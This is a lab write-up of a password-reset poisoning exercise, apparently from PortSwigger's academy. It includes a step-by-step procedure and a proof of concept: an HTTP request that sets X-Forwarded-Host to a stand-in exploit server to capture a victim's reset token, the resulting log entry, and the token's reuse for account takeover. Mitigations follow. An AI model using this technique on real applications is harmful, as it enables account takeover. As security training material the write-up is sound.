
# 11. Exploiting Password Reset via X-Forwarded-Host Header Manipulation

## 2. CVSS Score

**CVSS v3.1 Base Score: 7.8 (High)**
**CWE-346: Origin Validation Error**
**CWE-640: Weak Password Recovery Mechanism**

---

## 3. OWASP Top 10 Reference

* **A05:2021 – Security Misconfiguration**
* **A07:2021 – Identification and Authentication Failures**

---

## 4. Description of Vulnerability

This lab illustrates an insecure password reset flow where the application supports the `X-Forwarded-Host` HTTP header. An attacker can exploit this by setting the header to their own exploit server domain, causing password reset links to be sent pointing to the attacker-controlled site. This enables interception of the victim’s reset token and subsequent account takeover.

---

## 5. Detailed Explanation of What We Performed

* Observed that password reset links contain unique tokens sent via email.
* Sent a POST `/forgot-password` request with the `X-Forwarded-Host` header set to the attacker’s exploit server domain.
* Triggered a password reset request for the victim user `carlos`.
* Captured the victim’s password reset token from the exploit server’s access log.
* Used the stolen token on the legitimate password reset page to set a new password for the victim.
* Logged in to the victim’s account with the new password to solve the lab.

---

## 6. Step-by-Step Procedure

### Step 1: Intercept Password Reset Request

1. Send a POST request to `/forgot-password` in Burp Repeater.
2. Add the header:

```
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

3. Change the username parameter to `carlos`.
4. Send the request.

---

### Step 2: Capture Password Reset Token

5. Go to the exploit server’s access log.
6. Locate the GET request containing the victim’s password reset token in the query parameters.
7. Copy the token value.

---

### Step 3: Reset Victim Password Using Stolen Token

8. Open the legitimate password reset link from your email client (without the malicious domain).
9. Replace the `temp-forgot-password-token` parameter value with the stolen token.
10. Load the URL and set a new password for Carlos.

---

### Step 4: Confirm Account Takeover

11. Log in as Carlos using the new password.
12. The lab is solved.

---

## 7. Impact of the Vulnerability

* Allows attackers to intercept password reset tokens by redirecting reset emails.
* Enables full account takeover by setting a new password for the victim.
* Exploits trust in HTTP headers without proper validation.

---

## 8. Recommendations and Mitigations

* Do not rely on user-controllable headers like `X-Forwarded-Host` for generating links.
* Validate and whitelist headers or domains before using them in security-sensitive operations.
* Use absolute URLs with fixed trusted domains in emails.
* Implement token expiration and multi-factor verification for password resets.
* Log and monitor suspicious password reset activities.

---

## 9. References

* [OWASP Password Recovery Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html)
* [OWASP Security Misconfiguration](https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration)
* [PortSwigger Labs - Exploiting X-Forwarded-Host](https://portswigger.net/web-security/access-control/lab-manipulating-host-header)

---

## 10. Proof of Concept

### Malicious Password Reset Request Headers

```
POST /forgot-password HTTP/1.1
Host: target-app
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Content-Type: application/x-www-form-urlencoded

username=carlos
```

### Sample Exploit Server Access Log Entry

```
GET /forgot-password?temp-forgot-password-token=stolen-token HTTP/1.1
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

### Using Stolen Token in Legitimate Reset Link

```
https://target-app/my-account/reset-password?temp-forgot-password-token=stolen-token
```

